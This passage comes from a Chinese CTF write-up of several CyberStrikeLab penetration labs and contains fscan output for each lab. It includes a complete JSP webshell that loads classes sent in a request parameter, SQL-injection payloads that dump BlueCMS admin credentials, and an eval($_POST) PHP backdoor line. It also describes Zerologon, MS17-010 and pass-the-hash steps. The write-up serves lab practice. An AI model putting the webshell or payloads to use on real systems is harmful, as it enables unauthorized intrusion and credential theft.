+   <span class="hljs-string">[-&gt;]</span>DESKTOP-JFB57A8
+   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>
+<span class="hljs-string">[*]</span> NetBios <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>   cyberweb.cyberstrikelab.com         Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span>
+<span class="hljs-string">[*]</span> WebTitle https://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">11432</span>  title:Apache Tomcat/<span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">19</span>
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>:<span class="hljs-number">8080</span> poc-yaml-iis-put-getshell
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>:<span class="hljs-number">808</span>  code:<span class="hljs-number">200</span> len:<span class="hljs-number">20287</span>  title:骑士PHP高端人才系统(www.74cms.com)
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>:<span class="hljs-number">8080</span> poc-yaml-tomcat-cve-<span class="hljs-number">2017</span>-<span class="hljs-number">12615</span>-rce</code></pre></div>
+
+<h2 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h2><p>眼睛够瞎，我把后面两个打完了发现不知道10.10咋打，结果看了下wp，是74cms那个站。。。。</p>
+<p>根据版本找到后台getshell漏洞，登录密码弱口令admin&#x2F;admin123456</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63253040/article/details/127041028">骑士CMS01 74cms v4.2.111 后台getshell漏洞复现_查看骑士cms的版本-CSDN博客</a></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250512231510335.png" srcset="/img/loading.gif" lazyload alt="image-20250512231510335"></p>
+<h2 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h2><p>直接打扫出来的cve-2017-12615，put一个jsp木马</p>
+<p>太久没用蚁剑连jsp了，都忘记蚁剑要连咋样的jsp了，这里存一下</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">&lt;%!
+    <span class="hljs-keyword">class</span> U extends ClassLoader &#123;
+        <span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span> &#123;
+            super(c);
+        &#125;
+        public Class g(byte<span class="hljs-literal">[]</span> b) &#123;
+            return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>, 0, <span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;
+        &#125;
+    &#125;
+ 
+    public byte<span class="hljs-literal">[]</span> base64<span class="hljs-constructor">Decode(String <span class="hljs-params">str</span>)</span> throws Exception &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>)</span>;
+            return (byte<span class="hljs-literal">[]</span>) clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(clazz.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>, str);
+        &#125; catch (Exception e) &#123;
+            Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.Base64&quot;</span>)</span>;
+            Object decoder = clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getDecoder&quot;</span>)</span>.invoke(null);
+            return (byte<span class="hljs-literal">[]</span>) decoder.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decode&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(decoder, str);
+        &#125;
+    &#125;
+%&gt;
+&lt;%
+    String cls = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;passwd&quot;</span>)</span>;
+    <span class="hljs-keyword">if</span> (cls != null) &#123;
+        <span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(base64<span class="hljs-constructor">Decode(<span class="hljs-params">cls</span>)</span>).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);
+    &#125;
+%&gt;</code></pre></div>
+
+<p><img src="/../images/cyberstrikelab-lab/image-20250512231809991.png" srcset="/img/loading.gif" lazyload alt="image-20250512231809991"></p>
+<h2 id="flag3-2"><a href="#flag3-2" class="headerlink" title="flag3"></a>flag3</h2><p>扫网段，挂代理</p>
+<p>扫出ms17-010，直接梭哈</p>
+<p>这里很奇怪，打了一次没成功，然后代理就连不上了，又要重上一次代理，然后又没成功</p>
+<p>我重上了四次。。。。</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250512232135930.png" srcset="/img/loading.gif" lazyload alt="image-20250512232135930"></p>
+<p>整个思路很简单，都是一些小问题卡了很长时间。。。</p>
+<h1 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h1><h2 id="flag1-3"><a href="#flag1-3" class="headerlink" title="flag1"></a>flag1</h2><div class="code-wrapper"><pre><code class="hljs accesslog">D:\CTF-tool\network\fscan1.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>&gt;fscan -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span>
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>
+start infoscan
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>  is alive
+<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">2</span>
+<span class="hljs-number">192.168.10.233:22</span> open
+<span class="hljs-number">192.168.10.10:135</span> open
+<span class="hljs-number">192.168.10.10:139</span> open
+<span class="hljs-number">192.168.10.10:445</span> open
+<span class="hljs-number">192.168.10.10:3306</span> open
+<span class="hljs-number">192.168.10.10:3590</span> open
+<span class="hljs-number">192.168.10.10:5040</span> open
+<span class="hljs-number">192.168.10.233:8080</span> open
+<span class="hljs-number">192.168.10.233:11333</span> open
+<span class="hljs-number">192.168.10.10:49664</span> open
+<span class="hljs-number">192.168.10.10:49665</span> open
+<span class="hljs-number">192.168.10.10:49666</span> open
+<span class="hljs-number">192.168.10.10:49668</span> open
+<span class="hljs-number">192.168.10.10:49667</span> open
+<span class="hljs-number">192.168.10.10:49669</span> open
+<span class="hljs-number">192.168.10.10:49670</span> open
+<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">16</span>
+start vulscan
+已完成 <span class="hljs-number">0</span>/<span class="hljs-number">16</span> <span class="hljs-string">[-]</span> Ms17010 <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span> read tcp <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">233</span>.<span class="hljs-number">2</span>:<span class="hljs-number">50789</span>-&gt;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>:<span class="hljs-number">445</span>: wsarecv: An existing connection was forcibly closed by the remote host.
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">11333</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[*]</span> WebTitle https://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>:<span class="hljs-number">3590</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">4047</span>   title:taoCMS演示</code></pre></div>
+
+<p>taocms，直接默认密码登录</p>
+<p>文件管理随便找个php加上木马连接即可</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250513014251553.png" srcset="/img/loading.gif" lazyload alt="image-20250513014251553"></p>
+<h2 id="flag2-3"><a href="#flag2-3" class="headerlink" title="flag2"></a>flag2</h2><p>扫网段，挂代理</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250513014343883.png" srcset="/img/loading.gif" lazyload alt="image-20250513014343883"></p>
+<p>这里扫的时候要-p指定一下端口范围，默认的扫不到</p>
+<p>192.168.20.20:8055是个thinkphp</p>
+<p>题目说到黑客已经留下木马，那么我们尝试爆破密码即可（我直接看wp看有什么工具，直接抄密码了）</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250513014606520.png" srcset="/img/loading.gif" lazyload alt="image-20250513014606520"></p>
+<h2 id="flag3-3"><a href="#flag3-3" class="headerlink" title="flag3"></a>flag3</h2><p><img src="/../images/cyberstrikelab-lab/image-20250513014635266.png" srcset="/img/loading.gif" lazyload alt="image-20250513014635266"></p>
+<p>可以发现20.30是域控</p>
+<p>可以使用zerologon置空域控密码（我也是看wp才知道的，想不到要用zerologon）</p>
+<p>去打即可，若是实战环境打完后要还原密码，不然会导致脱域</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250513014927978.png" srcset="/img/loading.gif" lazyload alt="image-20250513014927978"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250513014917959.png" srcset="/img/loading.gif" lazyload alt="image-20250513014917959"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250513015124182.png" srcset="/img/loading.gif" lazyload alt="image-20250513015124182"></p>
+<h1 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h1><h2 id="flag1-4"><a href="#flag1-4" class="headerlink" title="flag1"></a>flag1</h2><p>fscan是有点玄学的，指定端口后，一些poc反而扫不出来</p>
+<p>不指定端口扫不出东西，加上端口再扫一次，扫出cms</p>
+<div class="code-wrapper"><pre><code class="hljs accesslog">D:\CTF-tool\network\fscan1.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>&gt;fscan.exe -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">10000</span>
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>
+start infoscan
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>  is alive
+<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">2</span>
+<span class="hljs-number">192.168.10.10:139</span> open
+<span class="hljs-number">192.168.10.233:22</span> open
+<span class="hljs-number">192.168.10.10:135</span> open
+<span class="hljs-number">192.168.10.10:445</span> open
+<span class="hljs-number">192.168.10.10:3306</span> open
+<span class="hljs-number">192.168.10.10:3389</span> open
+<span class="hljs-number">192.168.10.10:5040</span> open
+<span class="hljs-number">192.168.10.10:5820</span> open
+<span class="hljs-number">192.168.10.10:7680</span> open
+<span class="hljs-number">192.168.10.233:8080</span> open
+<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">10</span>
+start vulscan
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>:<span class="hljs-number">5820</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">9243</span>   title:演示网站 - Powered by BlueCMS
+<span class="hljs-string">[*]</span> WebTitle https://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[+]</span> InfoScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>:<span class="hljs-number">5820</span> <span class="hljs-string">[CMS]</span></code></pre></div>
+
+
+
+<p>buecms 1.6 ，发现是后台getshell，先用一个sql注入弄出登录密码</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ad_js</span>.php?ad_id=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,group_concat(table_name)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=database()
+<span class="hljs-attribute">ad_js</span>.php?ad_id=<span class="hljs-number">1</span> union select  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="hljs-number">0</span>x626c75655f61646d696e
+<span class="hljs-attribute">ad_js</span>.php?ad_id=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,group_concat(admin_name,<span class="hljs-number">0</span>x3a,pwd)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>blue_admin</code></pre></div>
+
+<p><img src="/../images/cyberstrikelab-lab/image-20250515181214976.png" srcset="/img/loading.gif" lazyload alt="image-20250515181214976"></p>
+<p>然后按照网上文章目录穿越到php文件，然后改内容</p>
+<p>但是我直接在中间加入<code>eval($_POST[1]);</code>发现连不上，卡了十几分钟，最后phpinfo看到目录写文件写了个马</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515181629026.png" srcset="/img/loading.gif" lazyload alt="image-20250515181629026"></p>
+<h2 id="flag2-（失败的尝试）"><a href="#flag2-（失败的尝试）" class="headerlink" title="flag2 （失败的尝试）"></a>flag2 （失败的尝试）</h2><p>这里我又指定端口扫一次，后来又不指定端口扫一遍，可以扫出个poc（虽然没什么用），奇奇怪怪的</p>
+<p>weblogic版本是12.2.1.4.0，是可以打cve-2024-20931的</p>
+<p>因为t3和iiop都是全开的</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515182022592.png" srcset="/img/loading.gif" lazyload alt="image-20250515182022592"></p>
+<p>但是他这访问不了公网，把工具传到入口的机子上试了下也不太行</p>
+<h2 id="flag3-4"><a href="#flag3-4" class="headerlink" title="flag3"></a>flag3</h2><p>没办法，只能先看20.30</p>
+<p>由于lab3的经验，能够发现20.30是域控</p>
+<p>想着打zerologon，但是我不知道主机名，然后就不会了</p>
+<p>看了篇wp发现<code>ping -a 192.168.20.30</code>能够显示主机名</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515182628932.png" srcset="/img/loading.gif" lazyload alt="image-20250515182628932"></p>
+<p>然后就打zerologon了</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515182649414.png" srcset="/img/loading.gif" lazyload alt="image-20250515182649414"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515182700498.png" srcset="/img/loading.gif" lazyload alt="image-20250515182700498"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515182711919.png" srcset="/img/loading.gif" lazyload alt="image-20250515182711919"></p>
+<h2 id="flag2-4"><a href="#flag2-4" class="headerlink" title="flag2"></a>flag2</h2><p>直接就pth</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515182748090.png" srcset="/img/loading.gif" lazyload alt="image-20250515182748090"></p>
+<p>我看的第一篇wp发现有人竟然是扫出ms17-010打的20.30.。。。。。。</p>
+<h1 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h1><h2 id="flag1-5"><a href="#flag1-5" class="headerlink" title="flag1"></a>flag1</h2><div class="code-wrapper"><pre><code class="hljs accesslog">D:\CTF-tool\network\fscan1.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>&gt;fscan.exe -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">10000</span>
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>
+start infoscan
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>  is alive
+<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">2</span>
+<span class="hljs-number">192.168.10.233:22</span> open
+<span class="hljs-number">192.168.10.10:139</span> open
+<span class="hljs-number">192.168.10.10:135</span> open
+<span class="hljs-number">192.168.10.10:445</span> open
+<span class="hljs-number">192.168.10.10:3306</span> open
+<span class="hljs-number">192.168.10.10:5040</span> open
+<span class="hljs-number">192.168.10.10:6582</span> open
+<span class="hljs-number">192.168.10.10:7680</span> open
+<span class="hljs-number">192.168.10.233:8080</span> open
+<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">9</span>
+start vulscan
+<span class="hljs-string">[*]</span> WebTitle https://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>:<span class="hljs-number">6582</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">17532</span>  title:BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站</code></pre></div>
+
+<p>查漏洞，变量覆盖登录后台，文件上传getshell</p>
+<p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/8527645153/#_130">BeesCMS4.0多处漏洞复现 - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9928">BEEScms代码审计漏洞分析-先知社区 (aliyun.com)</a></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515185738231.png" srcset="/img/loading.gif" lazyload alt="image-20250515185738231"></p>
+<h2 id="flag2-5"><a href="#flag2-5" class="headerlink" title="flag2"></a>flag2</h2><p><img src="/../images/cyberstrikelab-lab/image-20250515200212213.png" srcset="/img/loading.gif" lazyload alt="image-20250515200212213"></p>
+<p>发现jboss，发现弱密码admin&#x2F;admin</p>
+<p>部署war包访问一直报错</p>
+<p>然后指定了下jboss 6发现cve-2017-12149反序列化漏洞</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515200013438.png" srcset="/img/loading.gif" lazyload alt="image-20250515200013438"></p>
+<h2 id="flag3-5"><a href="#flag3-5" class="headerlink" title="flag3"></a>flag3</h2><p>没有啥提示，还是尝试zerologon</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515200341970.png" srcset="/img/loading.gif" lazyload alt="image-20250515200341970"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515200354450.png" srcset="/img/loading.gif" lazyload alt="image-20250515200354450"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515200411594.png" srcset="/img/loading.gif" lazyload alt="image-20250515200411594"></p>
+<h1 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h1><h2 id="flag1-6"><a href="#flag1-6" class="headerlink" title="flag1"></a>flag1</h2><div class="code-wrapper"><pre><code class="hljs accesslog">D:\CTF-tool\network\fscan1.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>&gt;fscan.exe -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">10000</span>
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>
+start infoscan
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>  is alive
+<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">3</span>
+<span class="hljs-number">192.168.10.233:22</span> open
+<span class="hljs-number">192.168.10.10:80</span> open
+<span class="hljs-number">192.168.10.20:139</span> open
+<span class="hljs-number">192.168.10.10:139</span> open
+<span class="hljs-number">192.168.10.10:135</span> open
+<span class="hljs-number">192.168.10.20:135</span> open
+<span class="hljs-number">192.168.10.10:445</span> open
+<span class="hljs-number">192.168.10.20:445</span> open
+<span class="hljs-number">192.168.10.10:3306</span> open
+<span class="hljs-number">192.168.10.10:5985</span> open
+<span class="hljs-number">192.168.10.20:5985</span> open
+<span class="hljs-number">192.168.10.20:7001</span> open
+<span class="hljs-number">192.168.10.233:8080</span> open
+<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">13</span>
+start vulscan
+<span class="hljs-string">[*]</span> NetInfo
+<span class="hljs-string">[*]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>
+   <span class="hljs-string">[-&gt;]</span>WIN-P5ECGG92B08
+   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>:<span class="hljs-number">5985</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">315</span>    title:Not Found
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>:<span class="hljs-number">5985</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">315</span>    title:Not Found
+<span class="hljs-string">[*]</span> NetBios <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>   cyberweb.cyberstrikelab.com         Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span>
+<span class="hljs-string">[*]</span> WebTitle https://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">6060</span>   title:Home
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">1164</span>   title:Error <span class="hljs-number">404</span>--Not Found
+<span class="hljs-string">[+]</span> InfoScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> <span class="hljs-string">[weblogic]</span>
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> poc-yaml-weblogic-cve-<span class="hljs-number">2019</span>-<span class="hljs-number">2725</span> v12</code></pre></div>
+
+
+
+<p>刚开始没看出是什么框架，后来看了下插件，发现是joomla</p>
+<p>找了个rce的试一下</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11663739.html">Joomla 3.0.0 -3.4.6远程代码执行(RCE)漏洞复现 - 雨中落叶 - 博客园 (cnblogs.com)</a></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515215029244.png" srcset="/img/loading.gif" lazyload alt="image-20250515215029244"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515215104547.png" srcset="/img/loading.gif" lazyload alt="image-20250515215104547"></p>
+<h2 id="flag2-6"><a href="#flag2-6" class="headerlink" title="flag2"></a>flag2</h2><p>我没看扫出来的cve，直接拿工具扫一下就发现能命令执行了</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515215302891.png" srcset="/img/loading.gif" lazyload alt="image-20250515215302891"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515215245989.png" srcset="/img/loading.gif" lazyload alt="image-20250515215245989"></p>
+<h2 id="flag3-6"><a href="#flag3-6" class="headerlink" title="flag3"></a>flag3</h2><p>上个shell，传工具扫一下</p>
+<p>发现ms17-010</p>
+<div class="code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.20.20:7001</span> open
+<span class="hljs-number">192.168.20.20:135</span> open
+<span class="hljs-number">192.168.20.20:139</span> open
+<span class="hljs-number">192.168.20.20:445</span> open
+<span class="hljs-string">[*]</span> NetBios <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>   cyberweb.cyberstrikelab.com         Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span>
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">1164</span>   title:Error <span class="hljs-number">404</span>--Not Found
+<span class="hljs-string">[+]</span> InfoScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> <span class="hljs-string">[weblogic]</span> 
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> poc-yaml-weblogic-cve-<span class="hljs-number">2019</span>-<span class="hljs-number">2725</span> v12
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> poc-yaml-weblogic-cve-<span class="hljs-number">2020</span>-<span class="hljs-number">14750</span> 
+<span class="hljs-number">192.168.20.30:135</span> open
+<span class="hljs-number">192.168.20.20:135</span> open
